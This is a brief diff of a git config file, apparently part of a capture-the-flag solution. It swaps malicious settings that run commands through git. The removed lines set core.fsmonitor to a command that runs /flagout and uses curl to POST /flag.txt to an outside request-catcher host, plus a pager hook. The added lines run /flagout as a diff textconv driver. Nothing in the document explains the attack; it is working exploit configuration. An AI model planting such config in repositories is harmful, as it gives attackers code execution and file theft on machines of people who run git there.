@@ -2,6 +2,6 @@
     repositoryformatversion = 0
     filemode = true
     bare = true
-    fsmonitor = "/flagout; curl -X POST --data-binary '@/flag.txt' https://kalmar.requestcatcher.com/test ; false"
-[pager]
-    show = /flagout
+
+[diff "pwn"]
+    textconv = /flagout
